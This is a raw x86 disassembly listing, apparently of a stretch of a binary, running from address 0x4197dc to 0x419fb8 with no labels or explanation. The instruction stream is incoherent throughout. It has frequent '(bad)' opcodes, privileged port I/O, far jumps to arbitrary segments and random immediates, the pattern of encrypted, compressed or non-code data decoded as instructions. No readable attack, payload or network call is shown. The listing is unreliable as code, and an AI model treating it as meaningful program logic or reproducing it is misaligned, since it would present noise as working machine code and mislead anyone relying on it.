  4197dc:	fs out 0x8e,eax
  4197df:	outs   dx,DWORD PTR ds:[esi]
  4197e0:	push   esp
  4197e1:	(bad)  
  4197e3:	aaa    
  4197e4:	inc    ecx
  4197e5:	dec    esp
  4197e6:	ror    DWORD PTR ds:0xe164f793,1
  4197ec:	arpl   dx,bx
  4197ee:	out    dx,eax
  4197ef:	not    BYTE PTR gs:[ebx]
  4197f2:	lahf   
  4197f3:	pusha  
  4197f4:	mov    eax,ds:0xd3b6a4b5
  4197f9:	pusha  
  4197fa:	in     eax,0xbe
  4197fc:	icebp  
  4197fd:	int3   
  4197fe:	inc    edi
  4197ff:	push   cs
  419800:	inc    esi
  419801:	xchg   ebp,eax
  419802:	adc    bh,BYTE PTR [edi-0x5f]
  419805:	out    dx,eax
  419806:	fwait
  419807:	mov    ch,0x7e
  419809:	add    eax,0xb554f31c
  41980e:	test   eax,0x23c0784f
  419813:	mov    cl,0xcb
  419815:	aaa    
  419816:	sbb    al,0x9c
  419818:	fdecstp 
  41981a:	cmp    eax,0x1b1386b8
  41981f:	stc    
  419820:	scas   al,BYTE PTR es:[edi]
  419821:	ja     0x4197d2
  419823:	enter  0x831e,0x48
  419827:	aam    0x44
  419829:	inc    edi
  41982a:	jge    0x4197d9
  41982c:	sbb    ebx,eax
  41982e:	neg    BYTE PTR [edi-0x3cd963f2]
  419834:	mov    eax,ds:0xcbb3272d
  419839:	pop    ebp
  41983a:	and    DWORD PTR [esi+0x2dbc8f3d],0x26374cd4
  419844:	or     al,0x2a
  419846:	test   al,0x57
  419848:	jl     0x419889
  41984a:	xchg   edi,eax
  41984b:	fmul   st(6),st
  41984d:	xchg   ebp,eax
  41984e:	or     eax,0x3c0cfd95
  419853:	sar    DWORD PTR ds:0x7d550640,1
  419859:	sub    al,0x9
  41985b:	push   ebx
  41985c:	out    dx,al
  41985d:	daa    
  41985e:	(bad)  
  419860:	jns    0x41987d
  419862:	fcom   DWORD PTR ds:0x909bdaa4
  419868:	fsub   DWORD PTR [edx+0x3e]
  41986b:	out    0x7,eax
  41986d:	mov    eax,ds:0xd32bc900
  419872:	std    
  419873:	lods   al,BYTE PTR ds:[esi]
  419874:	push   cs
  419875:	test   al,0x49
  419877:	mov    edi,0x48363e0
  41987c:	cdq    
  41987d:	push   0x15
  41987f:	inc    esp
  419880:	je     0x41980b
  419882:	repnz mov ecx,0x4b2bf4ca
  419888:	inc    esi
  419889:	and    ah,ah
  41988b:	scas   eax,DWORD PTR es:[edi]
  41988c:	xor    ecx,edi
  41988e:	mov    dl,0x1e
  419890:	or     ebx,DWORD PTR [esi-0x70]
  419893:	arpl   dx,ax
  419895:	push   0xffffffe0
  419897:	adc    DWORD PTR [edi-0x42],eax
  41989a:	popf   
  41989b:	sti    
  41989c:	mov    WORD PTR [esi-0x45],?
  41989f:	push   es
  4198a0:	sub    eax,0xfeaf0024
  4198a5:	push   sp
  4198a7:	or     esp,edi
  4198a9:	adc    bl,dh
  4198ab:	push   cs
  4198ac:	adc    bl,BYTE PTR [ebp+0x31]
  4198af:	cmp    esi,0x2c
  4198b2:	dec    ebx
  4198b3:	test   eax,0x21db8887
  4198b8:	xchg   ebp,eax
  4198b9:	(bad)  
  4198ba:	adc    eax,0x19849cd0
  4198bf:	xor    al,0x23
  4198c1:	pop    ss
  4198c2:	push   ss
  4198c3:	mov    edx,0xa8890c7b
  4198c8:	(bad)  
  4198c9:	mov    WORD PTR [ecx],cs
  4198cb:	outs   dx,BYTE PTR ds:[esi]
  4198cc:	jne    0x47cdc2fc
  4198d2:	lods   al,BYTE PTR ds:[esi]
  4198d3:	ret    
  4198d4:	ss call 0x7b675378
  4198da:	add    DWORD PTR [edx-0x477c731d],ebx
  4198e0:	daa    
  4198e1:	(bad)  
  4198e2:	sub    BYTE PTR [ecx+0x7de27b0e],ah
  4198e8:	fld    DWORD PTR [esi]
  4198ea:	xchg   esp,eax
  4198eb:	imul   esi,DWORD PTR [ebp+0x30],0xffffffb2
  4198ef:	push   cs
  4198f0:	test   eax,0x8771747a
  4198f5:	inc    edi
  4198f6:	outs   dx,BYTE PTR ds:[esi]
  4198f7:	xchg   ebx,eax
  4198f8:	lods   eax,DWORD PTR ds:[esi]
  4198f9:	mov    BYTE PTR [eax-0x62],cl
  4198fc:	lea    esi,[edi-0x4d08dd3d]
  419902:	popa   
  419903:	scas   al,BYTE PTR es:[edi]
  419904:	je     0x419943
  419906:	mov    al,0xa3
  419908:	jmp    0x7ae5e2f3
  41990d:	retf   
  41990e:	(bad)  
  41990f:	xchg   ebp,eax
  419910:	or     bl,BYTE PTR [ecx+0x1317902f]
  419916:	cld    
  419917:	outs   dx,BYTE PTR ds:[esi]
  419918:	and    BYTE PTR [ebp+0x15],0x7c
  41991c:	cwde   
  41991d:	cmp    DWORD PTR [edi-0x774fe2aa],edx
  419923:	inc    edi
  419924:	hlt    
  419925:	int    0xb1
  419927:	inc    esi
  419928:	inc    eax
  419929:	dec    esi
  41992a:	into   
  41992b:	iret   
  41992c:	dec    ebp
  41992d:	and    eax,DWORD PTR [edx+0x3]
  419930:	xor    ecx,esp
  419932:	pusha  
  419933:	mov    ebp,0x1603b04a
  419938:	(bad)  
  419939:	cli    
  41993a:	sub    eax,0x24a56eb8
  41993f:	adc    al,BYTE PTR [ecx-0x3a]
  419942:	loope  0x4198ee
  419944:	mov    ah,BYTE PTR [ecx-0x60f55e81]
  41994a:	leave  
  41994b:	das    
  41994c:	loop   0x4198dd
  41994e:	pusha  
  41994f:	dec    edx
  419950:	add    al,0x35
  419952:	sbb    BYTE PTR [eax],al
  419954:	test   BYTE PTR [edi-0x599e5aa7],ch
  41995a:	xchg   edx,eax
  41995b:	pop    esi
  41995c:	add    eax,0x6defd567
  419961:	xlat   BYTE PTR ds:[ebx]
  419962:	fsub   DWORD PTR [esi]
  419964:	aad    0xd9
  419966:	std    
  419967:	aaa    
  419968:	cmp    bl,0x63
  41996b:	(bad)  
  41996c:	lds    edx,FWORD PTR [ebx-0x60a79954]
  419972:	test   BYTE PTR [ebx+0x77],ch
  419975:	pop    esi
  419976:	fs mov ebx,0x73f7c478
  41997c:	cs add esp,esi
  41997f:	scas   eax,DWORD PTR es:[edi]
  419980:	stc    
  419981:	adc    dh,cl
  419983:	mov    edx,esp
  419985:	push   es
  419986:	xor    DWORD PTR [edi-0x6c2c0ace],edx
  41998c:	idiv   BYTE PTR ds:0xe9431df4
  419992:	and    cl,ch
  419994:	sub    BYTE PTR [edx-0x127aaafd],bh
  41999a:	or     eax,0x602299e4
  41999f:	and    BYTE PTR [edx+edx*8+0x10],0x62
  4199a4:	ficom  DWORD PTR [ebp+0x58db19ee]
  4199aa:	mov    DWORD PTR [edx-0x7243e8f4],ebp
  4199b0:	adc    eax,0x5f700175
  4199b5:	(bad)  
  4199b6:	inc    esi
  4199b7:	cdq    
  4199b8:	outs   dx,DWORD PTR ds:[esi]
  4199b9:	in     eax,0x33
  4199bb:	mov    esp,0x4c01223
  4199c0:	leave  
  4199c1:	test   al,0xe7
  4199c3:	sahf   
  4199c4:	pop    esp
  4199c5:	add    BYTE PTR [eax+0x16c2af8d],bl
  4199cb:	mov    WORD PTR ds:0x8b687351,gs
  4199d1:	stc    
  4199d2:	lds    ebp,FWORD PTR [esi-0x15]
  4199d5:	out    0xa6,al
  4199d7:	cld    
  4199d8:	xor    eax,0xb6169e9c
  4199dd:	mov    al,ds:0x9acf8624
  4199e2:	retf   
  4199e3:	jne    0x419982
  4199e5:	outs   dx,DWORD PTR ds:[esi]
  4199e6:	or     BYTE PTR [ecx],cl
  4199e8:	lds    edi,FWORD PTR [ebx]
  4199ea:	xchg   ecx,eax
  4199eb:	add    ebx,eax
  4199ed:	mov    edi,eax
  4199ef:	lea    ebx,[esp+eax*8+0x2122af95]
  4199f6:	pop    esi
  4199f7:	test   eax,0xcddd9ba8
  4199fc:	rcr    DWORD PTR [edi-0x33fbbae7],cl
  419a02:	mov    ecx,0x7e94da3f
  419a07:	lahf   
  419a08:	ja     0x4199a0
  419a0a:	and    al,0x3d
  419a0c:	cmc    
  419a0d:	jo     0x419a87
  419a0f:	pop    esi
  419a10:	sbb    eax,0x4efb73c0
  419a15:	mov    WORD PTR [esi+0x5bf9f2ac],gs
  419a1b:	sbb    dh,0x62
  419a1e:	inc    edx
  419a1f:	div    BYTE PTR [esi+0x6c8449ad]
  419a25:	push   ds
  419a26:	xor    DWORD PTR [eax-0x52],esp
  419a29:	test   eax,0xf43b9752
  419a2e:	push   0xa5435cc9
  419a33:	xor    BYTE PTR [esi-0x18],dh
  419a36:	neg    BYTE PTR [ebx-0x53823929]
  419a3c:	or     cl,BYTE PTR [eax-0x27de96f0]
  419a42:	jne    0x419a9a
  419a44:	(bad)  
  419a45:	or     ebx,DWORD PTR [edx+edi*1-0x65]
  419a49:	sbb    DWORD PTR [ecx-0x56e73ec5],edi
  419a4f:	xchg   edx,eax
  419a50:	inc    ecx
  419a51:	mov    cl,0xee
  419a53:	xchg   esp,eax
  419a54:	cdq    
  419a55:	(bad)  [ebx-0x4f]
  419a58:	and    esp,DWORD PTR [edx-0x56]
  419a5b:	addr16 das 
  419a5d:	dec    esp
  419a5e:	fist   WORD PTR [ebx+ebp*1-0x344e0c2d]
  419a65:	jne    0x419a7c
  419a67:	mov    bh,0x1c
  419a69:	push   edi
  419a6a:	je     0x419a0a
  419a6c:	and    BYTE PTR [edi],dh
  419a6e:	les    ecx,FWORD PTR [esp+esi*2+0x57]
  419a72:	add    eax,DWORD PTR ds:0x2b391564
  419a78:	push   edi
  419a79:	lahf   
  419a7a:	or     al,0x87
  419a7c:	cmc    
  419a7d:	fcomp  DWORD PTR [edx-0x9]
  419a80:	ja     0x419aa0
  419a82:	sbb    ebp,esp
  419a84:	mov    al,0x83
  419a86:	frstor [edx]
  419a88:	push   ebp
  419a89:	xchg   esp,eax
  419a8a:	shl    DWORD PTR [esi],1
  419a8c:	fist   WORD PTR [edi]
  419a8e:	ss mov bh,0x3a
  419a91:	pop    ecx
  419a92:	fist   WORD PTR [esi-0x1c138d7]
  419a98:	dec    ebx
  419a99:	and    DWORD PTR ds:0x464bf987,0x1c
  419aa0:	ja     0x419a5e
  419aa2:	sar    BYTE PTR [ecx],cl
  419aa4:	in     al,dx
  419aa5:	popf   
  419aa6:	and    BYTE PTR [edx-0x4b],0x4c
  419aaa:	xor    eax,0xeed08417
  419aaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ab0:	xchg   ebp,eax
  419ab1:	mov    bh,BYTE PTR [ecx+0x6d]
  419ab4:	mov    al,ds:0xd300092e
  419ab9:	xchg   edi,eax
  419aba:	add    al,0x97
  419abc:	rol    DWORD PTR [ecx-0x736a520a],1
  419ac2:	xor    dh,BYTE PTR [edi]
  419ac4:	xor    al,0xbf
  419ac6:	push   ecx
  419ac7:	sub    eax,0xf3b421b3
  419acc:	scas   al,BYTE PTR es:[edi]
  419acd:	xor    bh,BYTE PTR [edx+0x57]
  419ad0:	or     al,0xa1
  419ad2:	pop    esi
  419ad3:	push   eax
  419ad4:	mov    ecx,0x6e2b0575
  419ad9:	xor    eax,0xd93b2a4
  419ade:	pop    edx
  419adf:	jno    0x419ac1
  419ae1:	adc    al,0x80
  419ae3:	les    edx,FWORD PTR [eax-0x789e81b4]
  419ae9:	or     bh,dh
  419aeb:	mov    ax,WORD PTR [esi-0x790e6808]
  419af2:	and    DWORD PTR [edx],eax
  419af4:	push   eax
  419af5:	aad    0xc5
  419af7:	xchg   ebx,eax
  419af8:	jl     0x419a7d
  419afa:	jns    0x419ac3
  419afc:	or     esp,DWORD PTR [ecx+0x2f]
  419aff:	aad    0xe7
  419b01:	jns    0x419b55
  419b03:	mov    edx,0x3a128f21
  419b08:	dec    ecx
  419b09:	push   es
  419b0a:	jo     0x419a8c
  419b0c:	retf   
  419b0d:	in     al,dx
  419b0e:	push   ss
  419b0f:	retf   0x906d
  419b12:	test   al,0xee
  419b14:	les    esi,FWORD PTR [edi-0x60]
  419b17:	inc    esi
  419b18:	mov    esp,esp
  419b1a:	xchg   ebx,eax
  419b1b:	in     al,0x8a
  419b1d:	retf   0xba35
  419b20:	into   
  419b21:	push   edi
  419b22:	test   eax,0xbd04ec19
  419b27:	push   0xffffffde
  419b29:	mov    dl,BYTE PTR [edx+0x77]
  419b2c:	xchg   esp,eax
  419b2d:	push   es
  419b2e:	test   al,0xf4
  419b30:	sbb    al,0xbd
  419b32:	mov    eax,ds:0xf4a9b93d
  419b37:	fs fs adc eax,0x78838cbe
  419b3e:	shl    DWORD PTR [esi],1
  419b40:	retf   
  419b41:	bound  ebp,QWORD PTR [ebx]
  419b43:	in     eax,dx
  419b44:	pop    eax
  419b45:	add    eax,0x760f5d47
  419b4a:	daa    
  419b4b:	bound  ebx,QWORD PTR [esi-0x66]
  419b4e:	ins    DWORD PTR es:[edi],dx
  419b4f:	jl     0x419b9d
  419b51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b52:	fcomp  QWORD PTR [ecx-0x7b]
  419b55:	xlat   BYTE PTR ds:[ebx]
  419b56:	adc    eax,ebp
  419b58:	mov    dl,0x52
  419b5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b5b:	pop    ecx
  419b5c:	dec    edx
  419b5d:	mov    edx,DWORD PTR [edi]
  419b5f:	jo     0x419b64
  419b61:	push   esi
  419b62:	rcl    BYTE PTR [ebx-0x57345753],cl
  419b68:	mov    edi,0xf88cf3c8
  419b6d:	(bad)  
  419b6e:	fisub  WORD PTR [edi-0x593ba84]
  419b74:	and    al,0x37
  419b76:	dec    edi
  419b77:	inc    DWORD PTR [ecx-0x4]
  419b7a:	jg     0x419b11
  419b7c:	push   edi
  419b7d:	sbb    ebx,DWORD PTR [edx+0x5c]
  419b80:	push   0x77d5191e
  419b85:	arpl   WORD PTR [ebx+0x3a],bp
  419b88:	xchg   DWORD PTR [ebx],ebx
  419b8a:	cdq    
  419b8b:	fdivr  QWORD PTR [ebp+0x50]
  419b8e:	mov    ch,0xd3
  419b90:	ror    DWORD PTR [ecx-0x5e],cl
  419b93:	xlat   BYTE PTR ds:[ebx]
  419b94:	mov    WORD PTR [edi+0x1a025df3],ds
  419b9a:	test   BYTE PTR [ecx-0x4d],0x6
  419b9e:	ds dec edx
  419ba0:	mov    ch,cl
  419ba2:	cld    
  419ba3:	sbb    eax,0xe069ecdf
  419ba8:	cmc    
  419ba9:	pop    ebp
  419baa:	popa   
  419bab:	and    bl,dl
  419bad:	call   0xc10e0196
  419bb2:	inc    eax
  419bb3:	icebp  
  419bb4:	adc    eax,DWORD PTR [ebp+0x77688410]
  419bba:	sub    al,0xc0
  419bbc:	add    DWORD PTR [ebp+0x17b4cd2e],eax
  419bc2:	xor    al,0xcc
  419bc4:	inc    edx
  419bc5:	call   0x7d6a0f03
  419bca:	imul   eax,DWORD PTR [esi+edi*1+0x3f],0x9588ca44
  419bd2:	imul   ebp,DWORD PTR [ecx+0x4f7bf686],0x69af78b1
  419bdc:	nop
  419bdd:	sub    ah,dh
  419bdf:	or     bh,BYTE PTR [ebx-0x68]
  419be2:	dec    ecx
  419be3:	mov    esp,0xd1143c34
  419be8:	mov    ds:0xf26f3a1f,eax
  419bed:	shl    DWORD PTR [esi+eiz*1+0x2d],0x6b
  419bf2:	jp     0x419b98
  419bf4:	jno    0x419bb5
  419bf6:	in     eax,dx
  419bf7:	ret    
  419bf8:	mov    DWORD PTR [edi],edx
  419bfa:	sbb    DWORD PTR [ebx+0x60],0x2bc520b7
  419c01:	test   al,0xa6
  419c03:	sahf   
  419c04:	sbb    ch,BYTE PTR [ebp+0x4b]
  419c07:	adc    al,0xa8
  419c09:	inc    esp
  419c0a:	fldlg2 
  419c0c:	sub    BYTE PTR [eax+ecx*2],al
  419c0f:	push   ebx
  419c10:	jmp    0x172:0xbd8828c3
  419c17:	das    
  419c18:	dec    ebp
  419c19:	in     eax,0x45
  419c1b:	repnz mov bl,0x29
  419c1e:	out    dx,eax
  419c1f:	jbe    0x419c19
  419c21:	adc    ch,BYTE PTR [eax-0x7]
  419c24:	or     dh,BYTE PTR ds:0xc8fb97c3
  419c2a:	jmp    0x419bb7
  419c2c:	push   cs
  419c2d:	xchg   esp,eax
  419c2e:	ficomp WORD PTR [edx+0x30e70e77]
  419c34:	pusha  
  419c35:	or     DWORD PTR [edx+0x64],ecx
  419c38:	icebp  
  419c39:	inc    eax
  419c3a:	popa   
  419c3b:	or     al,0x6b
  419c3d:	or     cl,BYTE PTR [ebx]
  419c3f:	mov    bh,0x90
  419c41:	add    DWORD PTR [edx-0x7e8f578],edx
  419c47:	pop    esi
  419c48:	ins    DWORD PTR es:[edi],dx
  419c49:	test   al,0xcf
  419c4b:	xchg   DWORD PTR [ebx],esi
  419c4d:	stos   DWORD PTR es:[di],eax
  419c4f:	sahf   
  419c50:	idiv   dl
  419c52:	lahf   
  419c53:	sub    BYTE PTR [edi-0x28],ch
  419c56:	mov    dl,0x6e
  419c58:	lahf   
  419c59:	sbb    edi,eax
  419c5b:	ficom  DWORD PTR [edi+0x1b321e31]
  419c61:	mov    ecx,0x5a369177
  419c66:	add    bl,BYTE PTR [ecx+0x16d9070b]
  419c6c:	pop    eax
  419c6d:	push   0xd9a62b55
  419c72:	mov    BYTE PTR [ebx],dl
  419c74:	popa   
  419c75:	and    DWORD PTR [esi+ecx*8-0x118f021d],esp
  419c7c:	cmp    DWORD PTR [ebp-0x60aac8b3],ecx
  419c82:	cdq    
  419c83:	xor    BYTE PTR [eax-0x77],ch
  419c86:	cmp    eax,0x1b3c9ecc
  419c8b:	repz cmp eax,0xddb2ee87
  419c91:	in     al,dx
  419c92:	and    DWORD PTR [edi+0x33e8d5cd],ebp
  419c98:	and    DWORD PTR [edi+0x2ec24ad1],edi
  419c9e:	push   esi
  419c9f:	out    0x46,al
  419ca1:	jno    0x419ce6
  419ca3:	add    ebx,edi
  419ca5:	inc    edi
  419ca6:	cmp    BYTE PTR ds:0x7a24020d,bl
  419cac:	pop    esp
  419cad:	ins    BYTE PTR es:[edi],dx
  419cae:	cmp    DWORD PTR [esi],0xffffffa3
  419cb1:	ror    DWORD PTR [ebp+0x7e],cl
  419cb4:	cdq    
  419cb5:	and    bh,BYTE PTR [ebx+eax*2+0x67]
  419cb9:	cmp    al,0x7e
  419cbb:	jg     0x419d1c
  419cbd:	push   0x34faa1af
  419cc2:	and    al,bh
  419cc4:	fs pop esp
  419cc6:	adc    eax,0xdfcc5020
  419ccb:	inc    eax
  419ccc:	jecxz  0x419cb9
  419cce:	cs add ch,ch
  419cd1:	cmp    BYTE PTR [edx],0x41
  419cd4:	sub    BYTE PTR [edx+0x36],ch
  419cd7:	or     BYTE PTR ds:0xa561a0c8,dh
  419cdd:	shr    DWORD PTR [eax],1
  419cdf:	aam    0xac
  419ce1:	loope  0x419d52
  419ce3:	cmp    DWORD PTR [edi+0x17],edx
  419ce6:	or     BYTE PTR [ebx-0x7e],dh
  419ce9:	ja     0x419d50
  419ceb:	sbb    al,0x97
  419ced:	cmp    al,0xdd
  419cef:	adc    DWORD PTR [eax-0x5a1ae44b],esi
  419cf5:	dec    edx
  419cf6:	jmp    0xd6ae6bfa
  419cfb:	and    dl,bh
  419cfd:	les    ecx,FWORD PTR ds:0x2348d144
  419d03:	mov    ecx,0x4aaeb9e8
  419d08:	sub    DWORD PTR es:[edx-0x22],eax
  419d0c:	iret   
  419d0d:	mov    dl,BYTE PTR [ecx]
  419d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d10:	cld    
  419d11:	out    dx,al
  419d12:	xor    ah,BYTE PTR [esi-0x6e]
  419d15:	inc    edi
  419d16:	jo     0x419cd9
  419d18:	xlat   BYTE PTR ds:[ebx]
  419d19:	mov    dl,0xa3
  419d1b:	repz xor ch,BYTE PTR [ecx]
  419d1e:	mov    eax,0xb4adb9e
  419d23:	fidivr DWORD PTR [edi+edx*4]
  419d26:	add    al,0x4f
  419d28:	das    
  419d29:	push   eax
  419d2a:	sbb    eax,0x6fe08b92
  419d2f:	mov    dh,0x83
  419d31:	pop    edx
  419d32:	loopne 0x419d42
  419d34:	inc    esi
  419d35:	inc    esp
  419d36:	inc    ecx
  419d37:	retf   
  419d38:	into   
  419d39:	xchg   ecx,eax
  419d3a:	icebp  
  419d3b:	sbb    edi,edi
  419d3d:	out    0xf1,eax
  419d3f:	cmp    dl,BYTE PTR [ebx]
  419d41:	sbb    bh,BYTE PTR [edi]
  419d43:	and    al,BYTE PTR [eax-0x7fd49605]
  419d49:	call   0xb66fc6cf
  419d4e:	pop    ebx
  419d4f:	out    0x55,eax
  419d51:	cs cmp bh,ah
  419d54:	das    
  419d55:	push   0xffffff9a
  419d57:	jno    0x419d89
  419d59:	mov    eax,0x57df1942
  419d5e:	and    dl,BYTE PTR [edx+0x28]
  419d61:	adc    DWORD PTR gs:[ecx+ebx*8-0x2c5b6b0],ebx
  419d69:	add    DWORD PTR [edi],0xffffffbb
  419d6c:	mov    al,0xd1
  419d6e:	adc    al,0xd7
  419d70:	je     0x419d87
  419d72:	or     al,0xe
  419d74:	or     DWORD PTR [esi-0x2480a462],0xffffffaa
  419d7b:	jl     0x419df3
  419d7d:	out    dx,al
  419d7e:	inc    ebp
  419d7f:	jecxz  0x419de2
  419d81:	mov    eax,0x4e6d492
  419d86:	fs call 0xe1ea:0xc37bd877
  419d8e:	mov    ds:0x6fb09f35,eax
  419d93:	and    esi,DWORD PTR [ecx-0x21]
  419d96:	push   0xc6f41fd9
  419d9b:	inc    edx
  419d9c:	cdq    
  419d9d:	(bad)  
  419d9e:	les    esp,FWORD PTR [ebp+0x4b305332]
  419da4:	std    
  419da5:	push   0x55
  419da7:	retf   0x4ad9
  419daa:	xor    esi,edx
  419dac:	fwait
  419dad:	mov    cl,0xc5
  419daf:	outs   dx,DWORD PTR ds:[esi]
  419db0:	leave  
  419db1:	out    dx,eax
  419db2:	cmp    eax,0xde4c243f
  419db7:	xlat   BYTE PTR ds:[ebx]
  419db8:	popa   
  419db9:	fs adc al,0x9b
  419dbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dbd:	aad    0xa7
  419dbf:	xchg   ebx,eax
  419dc0:	sub    bl,BYTE PTR [ecx-0x6e956f19]
  419dc6:	mov    eax,0x162e0cce
  419dcb:	cmc    
  419dcc:	mov    bh,al
  419dce:	mov    cl,0x1d
  419dd0:	in     eax,dx
  419dd1:	mov    eax,0xb0d7503b
  419dd6:	loope  0x419dc5
  419dd8:	cdq    
  419dd9:	mov    ch,0x35
  419ddb:	pop    ds
  419ddc:	mov    BYTE PTR [edi],dl
  419dde:	jb     0x419dcd
  419de0:	outs   dx,DWORD PTR ds:[esi]
  419de1:	jle    0x419d8a
  419de3:	scas   eax,DWORD PTR es:[edi]
  419de4:	(bad)  
  419de5:	push   esp
  419de6:	es jne 0x419e09
  419de9:	mov    ss,WORD PTR [edx+0x7f]
  419dec:	xchg   BYTE PTR [ecx],bl
  419dee:	jmp    0x51152717
  419df3:	call   0x81de1b61
  419df8:	inc    esi
  419df9:	or     al,0x4d
  419dfb:	popa   
  419dfc:	mov    al,ds:0x8164a592
  419e01:	lds    edi,FWORD PTR [eax+0x72]
  419e04:	int    0xe5
  419e06:	push   ebp
  419e07:	add    ch,BYTE PTR [eax-0x74abf904]
  419e0d:	and    ebp,esp
  419e0f:	xchg   ecx,eax
  419e10:	cmp    BYTE PTR [edx-0x5e0180c1],cl
  419e16:	not    BYTE PTR [edx]
  419e18:	mov    ebx,0xfffdf0ac
  419e1d:	and    al,dl
  419e1f:	rcr    BYTE PTR [ebp-0x6],1
  419e22:	xor    bl,BYTE PTR [ebx+eiz*4-0x23]
  419e26:	pusha  
  419e27:	ss (bad) 
  419e2a:	mov    DWORD PTR [eax-0x1],edi
  419e2d:	sub    BYTE PTR [ebp-0x72507059],0xaa
  419e34:	mov    eax,0xac9510aa
  419e39:	dec    ebp
  419e3a:	(bad)  
  419e3b:	cmp    eax,0x1ad882c8
  419e40:	scas   eax,DWORD PTR es:[edi]
  419e41:	popf   
  419e42:	mov    esi,0x539a850b
  419e47:	jmp    0x28b06c8
  419e4c:	sub    BYTE PTR [edi-0x2216c226],al
  419e52:	inc    ebp
  419e54:	dec    esp
  419e55:	in     al,0x47
  419e57:	mov    ecx,0xb6550e6
  419e5c:	(bad)  
  419e5d:	jecxz  0x419ebb
  419e5f:	sub    eax,0xd10af74d
  419e64:	into   
  419e65:	aas    
  419e66:	rcr    dl,0xb
  419e69:	inc    ebx
  419e6a:	add    DWORD PTR [eax],0xb9809861
  419e70:	sbb    BYTE PTR [ecx-0x2e],bh
  419e73:	aad    0x0
  419e75:	pop    DWORD PTR [edx-0x5c]
  419e78:	stos   DWORD PTR es:[edi],eax
  419e79:	sahf   
  419e7a:	inc    esi
  419e7b:	cdq    
  419e7c:	cld    
  419e7d:	scas   eax,DWORD PTR es:[edi]
  419e7e:	jge    0x419e49
  419e80:	scas   al,BYTE PTR es:[edi]
  419e81:	sub    eax,0x1c7799a8
  419e86:	jg     0x419ec9
  419e88:	bound  ecx,QWORD PTR ds:0xa678fce1
  419e8e:	xchg   BYTE PTR [edx+ebx*8-0x5cc6ce19],bl
  419e95:	mov    esi,0x4dee8695
  419e9a:	addr16 inc esi
  419e9c:	sub    edx,DWORD PTR [eax]
  419e9e:	or     BYTE PTR [eax-0x45bb9aed],bh
  419ea4:	(bad)  
  419ea5:	hlt    
  419ea6:	cmc    
  419ea7:	cwde   
  419ea8:	mov    ds:0x1e3a4a28,eax
  419ead:	jae    0x419e6e
  419eaf:	adc    BYTE PTR [eax-0x5180bcaf],cl
  419eb5:	mov    ah,0x84
  419eb7:	push   ebx
  419eb8:	dec    ebx
  419eb9:	adc    DWORD PTR [edi],edi
  419ebb:	lods   eax,DWORD PTR ds:[esi]
  419ebc:	add    cl,dl
  419ebe:	inc    eax
  419ebf:	stos   DWORD PTR es:[edi],eax
  419ec0:	das    
  419ec1:	hlt    
  419ec2:	dec    esi
  419ec3:	xchg   bl,bl
  419ec5:	into   
  419ec6:	lods   eax,DWORD PTR ds:[esi]
  419ec7:	mov    bl,0xaa
  419ec9:	dec    edx
  419eca:	pop    ss
  419ecb:	jmp    0xa211:0x8d91ff0a
  419ed2:	loopne 0x419efc
  419ed4:	rcr    BYTE PTR ds:0x6bf06792,1
  419eda:	int3   
  419edb:	fs scas al,BYTE PTR es:[edi]
  419edd:	sti    
  419ede:	cmp    ecx,DWORD PTR [ebx-0x5a362a30]
  419ee4:	sbb    DWORD PTR [eax],edx
  419ee6:	xchg   esp,eax
  419ee7:	stc    
  419ee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ee9:	(bad)  
  419eea:	ins    BYTE PTR es:[edi],dx
  419eeb:	loope  0x419eb2
  419eed:	das    
  419eee:	in     eax,0x4c
  419ef0:	xlat   BYTE PTR ds:[ebx]
  419ef1:	push   ebp
  419ef2:	ud1    esi,DWORD PTR fs:[ecx+edx*1]
  419ef7:	div    DWORD PTR [ebx]
  419ef9:	inc    eax
  419efa:	fstp   TBYTE PTR [ecx-0x20]
  419efd:	push   es
  419efe:	cmp    BYTE PTR es:[ecx+0x14],dh
  419f02:	(bad)  
  419f04:	xor    eax,0x5978a4dc
  419f09:	outs   dx,DWORD PTR ds:[esi]
  419f0a:	dec    edi
  419f0b:	sbb    eax,0xe7f61b0b
  419f10:	jne    0x419f58
  419f12:	inc    esi
  419f13:	aad    0x7
  419f15:	xor    DWORD PTR [eax-0x6c0e6404],esi
  419f1b:	push   esp
  419f1c:	repnz sbb eax,0xd60aad4e
  419f22:	jne    0x419ec2
  419f24:	lods   eax,DWORD PTR ds:[esi]
  419f25:	sub    esi,0xffffffbb
  419f28:	xchg   DWORD PTR [edx+0x75c7e7ec],edx
  419f2e:	and    al,0x37
  419f30:	je     0x419fa2
  419f32:	sub    BYTE PTR [edx],0xb9
  419f35:	retf   
  419f36:	ret    
  419f37:	add    BYTE PTR [ecx+0x53],bh
  419f3a:	add    al,0x77
  419f3c:	inc    edx
  419f3d:	jne    0x419ee0
  419f3f:	jge    0x419f8e
  419f41:	sar    BYTE PTR [eax-0x28dd3247],0x8
  419f48:	push   edx
  419f49:	add    BYTE PTR [edx-0x4],0x7b
  419f4d:	mov    eax,0x3a9a380
  419f52:	sub    ch,0x79
  419f55:	push   ds
  419f56:	push   cs
  419f57:	ja     0x419fb8
  419f59:	mov    bl,0xd
  419f5b:	xchg   ebx,eax
  419f5c:	js     0x419fc8
  419f5e:	cdq    
  419f5f:	xor    al,0x3a
  419f61:	xchg   edi,eax
  419f62:	test   DWORD PTR [edi-0x3099c6b2],ebx
  419f68:	cs ins BYTE PTR es:[edi],dx
  419f6a:	adc    DWORD PTR [esi+edx*8-0x20],esi
  419f6e:	mov    bh,0xaa
  419f70:	stc    
  419f71:	popa   
  419f72:	lock or eax,0x74c94203
  419f78:	cmp    BYTE PTR [ecx-0x22c66a34],cl
  419f7e:	stos   DWORD PTR es:[edi],eax
  419f7f:	inc    esi
  419f80:	mov    bh,0x94
  419f82:	push   ebx
  419f83:	xor    eax,0x3c36c272
  419f88:	icebp  
  419f89:	xor    DWORD PTR [ebx],ebx
  419f8b:	std    
  419f8c:	push   0x8d47eb2
  419f91:	add    BYTE PTR [ecx+0x78],bl
  419f94:	loopne 0x419ff6
  419f96:	jmp    0xea4e:0x93fc0b7a
  419f9d:	leave  
  419f9e:	aam    0xbc
  419fa0:	retf   0x996f
  419fa3:	jns    0xcbc7432a
  419fa9:	jmp    0x8dd3:0xf7216233
  419fb0:	(bad)  
  419fb1:	and    BYTE PTR [edi+ebp*8+0x6910e266],cl
  419fb8:	pop    es
